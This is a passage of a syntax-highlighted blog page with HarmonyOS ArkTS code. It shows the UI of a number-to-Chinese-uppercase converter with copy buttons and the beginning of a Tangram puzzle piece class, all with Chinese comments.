class="comment">// 设置剪贴板数据</span></span><br><span class="line">    promptAction.<span class="title function_">showToast</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;已复制&#x27;</span> &#125;); <span class="comment">// 显示复制成功的提示</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 构建用户界面的方法</span></span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>() &#123; <span class="comment">// 主列容器</span></span><br><span class="line">      <span class="comment">// 页面标题</span></span><br><span class="line">      <span class="title class_">Text</span>(<span class="string">&#x27;数字转中文大小写&#x27;</span>)</span><br><span class="line">        .<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">textColor</span>) <span class="comment">// 设置字体颜色</span></span><br><span class="line">        .<span class="title function_">fontSize</span>(<span class="number">18</span>) <span class="comment">// 设置字体大小</span></span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// 设置宽度</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="number">50</span>) <span class="comment">// 设置高度</span></span><br><span class="line">        .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>) <span class="comment">// 文本居中对齐</span></span><br><span class="line">        .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>) <span class="comment">// 设置背景颜色</span></span><br><span class="line">        .<span class="title function_">shadow</span>(&#123; <span class="comment">// 添加阴影效果</span></span><br><span class="line">          <span class="attr">radius</span>: <span class="number">2</span>, <span class="comment">// 阴影半径</span></span><br><span class="line">          <span class="attr">color</span>: <span class="variable language_">this</span>.<span class="property">lineColor</span>, <span class="comment">// 阴影颜色</span></span><br><span class="line">          <span class="attr">offsetX</span>: <span class="number">0</span>, <span class="comment">// X轴偏移量</span></span><br><span class="line">          <span class="attr">offsetY</span>: <span class="number">5</span> <span class="comment">// Y轴偏移量</span></span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">      <span class="title class_">Scroll</span>() &#123; <span class="comment">// 滚动视图</span></span><br><span class="line">        <span class="title class_">Column</span>() &#123; <span class="comment">// 内部列容器</span></span><br><span class="line">          <span class="comment">// 工具介绍部分</span></span><br><span class="line">          <span class="title class_">Column</span>() &#123;</span><br><span class="line">            <span class="title class_">Text</span>(<span class="string">&#x27;工具介绍&#x27;</span>).<span class="title function_">fontSize</span>(<span class="number">20</span>).<span class="title function_">fontWeight</span>(<span class="number">600</span>).<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">textColor</span>); <span class="comment">// 设置介绍文字样式</span></span><br><span class="line">            <span class="title class_">Text</span>(<span class="string">&#x27;将数字转换为中文格式，适用于票据填写、合同文书、财务报表等多种场景。支持从最小单位“分”到最大单位“千兆”的数字转换。&#x27;</span>)</span><br><span class="line">              .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">JUSTIFY</span>)</span><br><span class="line">              .<span class="title function_">fontSize</span>(<span class="number">18</span>).<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">textColor</span>).<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding / <span class="number">2</span>&#125;</span>lpx`</span> &#125;); <span class="comment">// 设置介绍详情文字样式</span></span><br><span class="line">          &#125;</span><br><span class="line">          .<span class="title function_">alignItems</span>(<span class="title class_">HorizontalAlign</span>.<span class="property">Start</span>) <span class="comment">// 对齐方式</span></span><br><span class="line">          .<span class="title function_">width</span>(<span class="string">&#x27;650lpx&#x27;</span>) <span class="comment">// 设置宽度</span></span><br><span class="line">          .<span class="title function_">padding</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span>) <span class="comment">// 设置内边距</span></span><br><span class="line">          .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span> &#125;) <span class="comment">// 设置外边距</span></span><br><span class="line">          .<span class="title function_">borderRadius</span>(<span class="number">10</span>) <span class="comment">// 设置圆角</span></span><br><span class="line">          .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>) <span class="comment">// 设置背景颜色</span></span><br><span class="line">          .<span class="title function_">shadow</span>(&#123; <span class="comment">// 添加阴影效果</span></span><br><span class="line">            <span class="attr">radius</span>: <span class="number">10</span>, <span class="comment">// 阴影半径</span></span><br><span class="line">            <span class="attr">color</span>: <span class="variable language_">this</span>.<span class="property">lineColor</span>, <span class="comment">// 阴影颜色</span></span><br><span class="line">            <span class="attr">offsetX</span>: <span class="number">0</span>, <span class="comment">// X轴偏移量</span></span><br><span class="line">            <span class="attr">offsetY</span>: <span class="number">0</span> <span class="comment">// Y轴偏移量</span></span><br><span class="line">          &#125;);</span><br><span class="line"> </span><br><span class="line">          <span class="comment">// 输入区</span></span><br><span class="line">          <span class="title class_">Column</span>() &#123;</span><br><span class="line">            <span class="title class_">Row</span>() &#123; <span class="comment">// 行容器</span></span><br><span class="line">              <span class="title class_">Text</span>(<span class="string">&#x27;示例&#x27;</span>)</span><br><span class="line">                .<span class="title function_">fontColor</span>(<span class="string">&quot;#5871ce&quot;</span>) <span class="comment">// 设置字体颜色</span></span><br><span class="line">                .<span class="title function_">fontSize</span>(<span class="number">18</span>) <span class="comment">// 设置字体大小</span></span><br><span class="line">                .<span class="title function_">padding</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding / <span class="number">2</span>&#125;</span>lpx`</span>) <span class="comment">// 设置内边距</span></span><br><span class="line">                .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#f2f1fd&quot;</span>) <span class="comment">// 设置背景颜色</span></span><br><span class="line">                .<span class="title function_">borderRadius</span>(<span class="number">5</span>) <span class="comment">// 设置圆角</span></span><br><span class="line">                .<span class="title function_">clickEffect</span>(&#123; <span class="attr">level</span>: <span class="title class_">ClickEffectLevel</span>.<span class="property">LIGHT</span>, <span class="attr">scale</span>: <span class="number">0.8</span> &#125;) <span class="comment">// 设置点击效果</span></span><br><span class="line">                .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 点击事件</span></span><br><span class="line">                  <span class="variable language_">this</span>.<span class="property">inputText</span> = <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.exampleNumber&#125;</span>`</span>; <span class="comment">// 设置输入框文本为示例数字</span></span><br><span class="line">                &#125;);</span><br><span class="line">              <span class="title class_">Blank</span>(); <span class="comment">// 占位符</span></span><br><span class="line">              <span class="title class_">Text</span>(<span class="string">&#x27;清空&#x27;</span>)</span><br><span class="line">                .<span class="title function_">fontColor</span>(<span class="string">&quot;#e48742&quot;</span>) <span class="comment">// 设置字体颜色</span></span><br><span class="line">                .<span class="title function_">fontSize</span>(<span class="number">18</span>) <span class="comment">// 设置字体大小</span></span><br><span class="line">                .<span class="title function_">padding</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding / <span class="number">2</span>&#125;</span>lpx`</span>) <span class="comment">// 设置内边距</span></span><br><span class="line">                .<span class="title function_">clickEffect</span>(&#123; <span class="attr">level</span>: <span class="title class_">ClickEffectLevel</span>.<span class="property">LIGHT</span>, <span class="attr">scale</span>: <span class="number">0.8</span> &#125;) <span class="comment">// 设置点击效果</span></span><br><span class="line">                .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#ffefe6&quot;</span>) <span class="comment">// 设置背景颜色</span></span><br><span class="line">                .<span class="title function_">borderRadius</span>(<span class="number">5</span>) <span class="comment">// 设置圆角</span></span><br><span class="line">                .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 点击事件</span></span><br><span class="line">                  <span class="variable language_">this</span>.<span class="property">inputText</span> = <span class="string">&quot;&quot;</span>; <span class="comment">// 清空输入框</span></span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;.<span class="title function_">height</span>(<span class="number">45</span>) <span class="comment">// 设置高度</span></span><br><span class="line">            .<span class="title function_">justifyContent</span>(<span class="title class_">FlexAlign</span>.<span class="property">SpaceBetween</span>) <span class="comment">// 子元素水平分布方式</span></span><br><span class="line">            .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>); <span class="comment">// 设置宽度</span></span><br><span class="line">            <span class="title class_">Divider</span>().<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="number">5</span>, <span class="attr">bottom</span>: <span class="number">5</span> &#125;); <span class="comment">// 分割线</span></span><br><span class="line">            <span class="title class_">TextInput</span>(&#123; <span class="attr">text</span>: $$this.<span class="property">inputText</span>, <span class="attr">placeholder</span>: <span class="string">`请输入数字，例如：<span class="subst">$&#123;<span class="variable language_">this</span>.exampleNumber&#125;</span>`</span> &#125;) <span class="comment">// 输入框</span></span><br><span class="line">              .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// 设置宽度</span></span><br><span class="line">              .<span class="title function_">fontSize</span>(<span class="number">18</span>) <span class="comment">// 设置字体大小</span></span><br><span class="line">              .<span class="title function_">caretColor</span>(<span class="variable language_">this</span>.<span class="property">textColor</span>) <span class="comment">// 设置光标颜色</span></span><br><span class="line">              .<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">textColor</span>) <span class="comment">// 设置字体颜色</span></span><br><span class="line">              .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span> &#125;) <span class="comment">// 设置外边距</span></span><br><span class="line">              .<span class="title function_">padding</span>(<span class="number">0</span>) <span class="comment">// 设置内边距</span></span><br><span class="line">              .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">Transparent</span>) <span class="comment">// 设置背景颜色</span></span><br><span class="line">              .<span class="title function_">borderRadius</span>(<span class="number">0</span>) <span class="comment">// 设置圆角</span></span><br><span class="line">              .<span class="title function_">type</span>(<span class="title class_">InputType</span>.<span class="property">NUMBER_DECIMAL</span>); <span class="comment">// 设置输入类型为数字</span></span><br><span class="line">          &#125;</span><br><span class="line">          .<span class="title function_">alignItems</span>(<span class="title class_">HorizontalAlign</span>.<span class="property">Start</span>) <span class="comment">// 对齐方式</span></span><br><span class="line">          .<span class="title function_">width</span>(<span class="string">&#x27;650lpx&#x27;</span>) <span class="comment">// 设置宽度</span></span><br><span class="line">          .<span class="title function_">padding</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span>) <span class="comment">// 设置内边距</span></span><br><span class="line">          .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span> &#125;) <span class="comment">// 设置外边距</span></span><br><span class="line">          .<span class="title function_">borderRadius</span>(<span class="number">10</span>) <span class="comment">// 设置圆角</span></span><br><span class="line">          .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>) <span class="comment">// 设置背景颜色</span></span><br><span class="line">          .<span class="title function_">shadow</span>(&#123; <span class="comment">// 添加阴影效果</span></span><br><span class="line">            <span class="attr">radius</span>: <span class="number">10</span>, <span class="comment">// 阴影半径</span></span><br><span class="line">            <span class="attr">color</span>: <span class="variable language_">this</span>.<span class="property">lineColor</span>, <span class="comment">// 阴影颜色</span></span><br><span class="line">            <span class="attr">offsetX</span>: <span class="number">0</span>, <span class="comment">// X轴偏移量</span></span><br><span class="line">            <span class="attr">offsetY</span>: <span class="number">0</span> <span class="comment">// Y轴偏移量</span></span><br><span class="line">          &#125;);</span><br><span class="line"> </span><br><span class="line">          <span class="comment">// 结果区</span></span><br><span class="line">          <span class="title class_">Column</span>() &#123;</span><br><span class="line">            <span class="title class_">Row</span>() &#123;</span><br><span class="line">              <span class="title class_">Text</span>(<span class="string">`小写：<span class="subst">$&#123;<span class="variable language_">this</span>.chineseLowercase&#125;</span>`</span>).<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">textColor</span>).<span class="title function_">fontSize</span>(<span class="number">18</span>).<span class="title function_">layoutWeight</span>(<span class="number">1</span>); <span class="comment">// 显示小写结果</span></span><br><span class="line">              <span class="title class_">Text</span>(<span class="string">&#x27;复制&#x27;</span>)</span><br><span class="line">                .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>) <span class="comment">// 设置字体颜色</span></span><br><span class="line">                .<span class="title function_">fontSize</span>(<span class="number">18</span>) <span class="comment">// 设置字体大小</span></span><br><span class="line">                .<span class="title function_">padding</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding / <span class="number">2</span>&#125;</span>lpx`</span>) <span class="comment">// 设置内边距</span></span><br><span class="line">                .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#0052d9&quot;</span>) <span class="comment">// 设置背景颜色</span></span><br><span class="line">                .<span class="title function_">borderRadius</span>(<span class="number">5</span>) <span class="comment">// 设置圆角</span></span><br><span class="line">                .<span class="title function_">clickEffect</span>(&#123; <span class="attr">level</span>: <span class="title class_">ClickEffectLevel</span>.<span class="property">LIGHT</span>, <span class="attr">scale</span>: <span class="number">0.8</span> &#125;) <span class="comment">// 设置点击效果</span></span><br><span class="line">                .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 点击事件</span></span><br><span class="line">                  <span class="variable language_">this</span>.<span class="title function_">copyToClipboard</span>(<span class="variable language_">this</span>.<span class="property">chineseLowercase</span>); <span class="comment">// 复制小写结果到剪贴板</span></span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;.<span class="title function_">constraintSize</span>(&#123; <span class="attr">minHeight</span>: <span class="number">45</span> &#125;) <span class="comment">// 最小高度</span></span><br><span class="line">            .<span class="title function_">justifyContent</span>(<span class="title class_">FlexAlign</span>.<span class="property">SpaceBetween</span>) <span class="comment">// 子元素水平分布方式</span></span><br><span class="line">            .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>); <span class="comment">// 设置宽度</span></span><br><span class="line">            <span class="title class_">Divider</span>().<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="number">5</span>, <span class="attr">bottom</span>: <span class="number">5</span> &#125;); <span class="comment">// 分割线</span></span><br><span class="line">            <span class="title class_">Row</span>() &#123;</span><br><span class="line">              <span class="title class_">Text</span>(<span class="string">`大写：<span class="subst">$&#123;<span class="variable language_">this</span>.chineseUppercase&#125;</span>`</span>).<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">textColor</span>).<span class="title function_">fontSize</span>(<span class="number">18</span>).<span class="title function_">layoutWeight</span>(<span class="number">1</span>); <span class="comment">// 显示大写结果</span></span><br><span class="line">              <span class="title class_">Text</span>(<span class="string">&#x27;复制&#x27;</span>)</span><br><span class="line">                .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>) <span class="comment">// 设置字体颜色</span></span><br><span class="line">                .<span class="title function_">fontSize</span>(<span class="number">18</span>) <span class="comment">// 设置字体大小</span></span><br><span class="line">                .<span class="title function_">padding</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding / <span class="number">2</span>&#125;</span>lpx`</span>) <span class="comment">// 设置内边距</span></span><br><span class="line">                .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#0052d9&quot;</span>) <span class="comment">// 设置背景颜色</span></span><br><span class="line">                .<span class="title function_">borderRadius</span>(<span class="number">5</span>) <span class="comment">// 设置圆角</span></span><br><span class="line">                .<span class="title function_">clickEffect</span>(&#123; <span class="attr">level</span>: <span class="title class_">ClickEffectLevel</span>.<span class="property">LIGHT</span>, <span class="attr">scale</span>: <span class="number">0.8</span> &#125;) <span class="comment">// 设置点击效果</span></span><br><span class="line">                .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 点击事件</span></span><br><span class="line">                  <span class="variable language_">this</span>.<span class="title function_">copyToClipboard</span>(<span class="variable language_">this</span>.<span class="property">chineseUppercase</span>); <span class="comment">// 复制大写结果到剪贴板</span></span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;.<span class="title function_">constraintSize</span>(&#123; <span class="attr">minHeight</span>: <span class="number">45</span> &#125;) <span class="comment">// 最小高度</span></span><br><span class="line">            .<span class="title function_">justifyContent</span>(<span class="title class_">FlexAlign</span>.<span class="property">SpaceBetween</span>) <span class="comment">// 子元素水平分布方式</span></span><br><span class="line">            .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>); <span class="comment">// 设置宽度</span></span><br><span class="line">            <span class="title class_">Divider</span>().<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="number">5</span>, <span class="attr">bottom</span>: <span class="number">5</span> &#125;); <span class="comment">// 分割线</span></span><br><span class="line">            <span class="title class_">Row</span>() &#123;</span><br><span class="line">              <span class="title class_">Text</span>(<span class="string">`大写金额：<span class="subst">$&#123;<span class="variable language_">this</span>.chineseUppercaseAmount&#125;</span>`</span>).<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">textColor</span>).<span class="title function_">fontSize</span>(<span class="number">18</span>).<span class="title function_">layoutWeight</span>(<span class="number">1</span>); <span class="comment">// 显示大写金额结果</span></span><br><span class="line">              <span class="title class_">Text</span>(<span class="string">&#x27;复制&#x27;</span>)</span><br><span class="line">                .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>) <span class="comment">// 设置字体颜色</span></span><br><span class="line">                .<span class="title function_">fontSize</span>(<span class="number">18</span>) <span class="comment">// 设置字体大小</span></span><br><span class="line">                .<span class="title function_">padding</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding / <span class="number">2</span>&#125;</span>lpx`</span>) <span class="comment">// 设置内边距</span></span><br><span class="line">                .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#0052d9&quot;</span>) <span class="comment">// 设置背景颜色</span></span><br><span class="line">                .<span class="title function_">borderRadius</span>(<span class="number">5</span>) <span class="comment">// 设置圆角</span></span><br><span class="line">                .<span class="title function_">clickEffect</span>(&#123; <span class="attr">level</span>: <span class="title class_">ClickEffectLevel</span>.<span class="property">LIGHT</span>, <span class="attr">scale</span>: <span class="number">0.8</span> &#125;) <span class="comment">// 设置点击效果</span></span><br><span class="line">                .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 点击事件</span></span><br><span class="line">                  <span class="variable language_">this</span>.<span class="title function_">copyToClipboard</span>(<span class="variable language_">this</span>.<span class="property">chineseUppercaseAmount</span>); <span class="comment">// 复制大写金额结果到剪贴板</span></span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;.<span class="title function_">constraintSize</span>(&#123; <span class="attr">minHeight</span>: <span class="number">45</span> &#125;) <span class="comment">// 最小高度</span></span><br><span class="line">            .<span class="title function_">justifyContent</span>(<span class="title class_">FlexAlign</span>.<span class="property">SpaceBetween</span>) <span class="comment">// 子元素水平分布方式</span></span><br><span class="line">            .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>); <span class="comment">// 设置宽度</span></span><br><span class="line">          &#125;</span><br><span class="line">          .<span class="title function_">alignItems</span>(<span class="title class_">HorizontalAlign</span>.<span class="property">Start</span>) <span class="comment">// 对齐方式</span></span><br><span class="line">          .<span class="title function_">width</span>(<span class="string">&#x27;650lpx&#x27;</span>) <span class="comment">// 设置宽度</span></span><br><span class="line">          .<span class="title function_">padding</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span>) <span class="comment">// 设置内边距</span></span><br><span class="line">          .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span> &#125;) <span class="comment">// 设置外边距</span></span><br><span class="line">          .<span class="title function_">borderRadius</span>(<span class="number">10</span>) <span class="comment">// 设置圆角</span></span><br><span class="line">          .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>) <span class="comment">// 设置背景颜色</span></span><br><span class="line">          .<span class="title function_">shadow</span>(&#123; <span class="comment">// 添加阴影效果</span></span><br><span class="line">            <span class="attr">radius</span>: <span class="number">10</span>, <span class="comment">// 阴影半径</span></span><br><span class="line">            <span class="attr">color</span>: <span class="variable language_">this</span>.<span class="property">lineColor</span>, <span class="comment">// 阴影颜色</span></span><br><span class="line">            <span class="attr">offsetX</span>: <span class="number">0</span>, <span class="comment">// X轴偏移量</span></span><br><span class="line">            <span class="attr">offsetY</span>: <span class="number">0</span> <span class="comment">// Y轴偏移量</span></span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;.<span class="title function_">scrollBar</span>(<span class="title class_">BarState</span>.<span class="property">Off</span>).<span class="title function_">clip</span>(<span class="literal">false</span>); <span class="comment">// 关闭滚动条，不允许裁剪</span></span><br><span class="line">    &#125;</span><br><span class="line">    .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// 设置高度</span></span><br><span class="line">    .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// 设置宽度</span></span><br><span class="line">    .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#f4f8fb&quot;</span>); <span class="comment">// 设置页面背景颜色</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><!--erweimahttps://blog.csdn.net/zhongcongxu01/article/details/144009716---><h1 id="Tangram"><a href="#Tangram" class="headerlink" title="Tangram"></a>Tangram</h1><p>七巧板</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">@<span class="title class_">ObservedV2</span> <span class="comment">// 监听数据变化的装饰器</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TangramBlock</span> &#123; <span class="comment">// 定义七巧板类</span></span><br><span class="line">  <span class="attr">width</span>: number; <span class="comment">// 宽度</span></span><br><span class="line">  <span class="attr">height</span>: number; <span class="comment">// 高度</span></span><br><span class="line">  <span class="attr">points</span>: <span class="title class_">Array</span>&lt;[number, number]&gt;; <span class="comment">// 点坐标数组</span></span><br><span class="line">  <span class="attr">color</span>: string; <span class="comment">// 颜色</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">initialOffsetX</span>: number; <span class="comment">// 初始X偏移量</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">initialOffsetY</span>: number; <span class="comment">// 初始Y偏移量</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">currentOffsetX</span>: number; <span class="comment">// 当前X偏移量</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">currentOffsetY</span>: number; <span class="comment">// 当前Y偏移量</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">rotationAngle</span>: number; <span class="comment">// 旋转角度</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">flipAngle</span>: number = <span class="number">0</span>; <span class="comment">// 翻转角度，默认为0</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">rotateValue</span>: number; <span class="comment">// 旋转值</span></span><br><span class="line">  <span class="attr">defaultInitialOffsetX</span>: number; <span class="comment">// 默认初始X偏移量</span></span><br><span class="line">  <span class="attr">defaultInitialOffsetY</span>: number; <span class="comment">// 默认初始Y偏移量</span></span><br><span class="line">  <span class="attr">defaultRotationAngle</span>: number; <span class="comment">// 默认旋转角度</span></span><br><span class="line"> </span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">color: string, width: number, height: number, initialOffsetX: number, initialOffsetY: number,</span></span><br><span class="line"><span class="params">    rotationAngle: number, points: <span class="built_in">Array</span>&lt;[number, number]&gt;</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">initialOffsetX</span> = <span class="variable language_">this</span>.<span class="property">currentOffsetX</span> = <span class="variable language_">this</span>.<span class="property">defaultInitialOffsetX</span> = initialOffsetX; <span class="comment">// 初始化X偏移量</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">initialOffsetY</span> = <span class="variable language_">this</span>.<span class="property">currentOffsetY</span> = <span class="variable language_">this</span>.<span class="property">defaultInitialOffsetY</span> = initialOffsetY; <span class="comment">// 初始化Y偏移量</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">rotationAngle</span> = <span class="variable language_">this</span>.<span class="property">rotateValue</span> = <span class="variable language_">this</span>.<span class="property">defaultRotationAngle</span> = rotationAngle; <span class="comment">// 初始化旋转角度</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">color</span> = color; <span class="comment">// 设置颜色</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">width</span> = width; <span class="comment">// 设置宽度</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">height</span> = height; <span class="comment">// 设置高度</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">points</span> = points; <span class="comment">// 设置点坐标数组</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="title function_">resetData</span>(<span class="params"></span>) 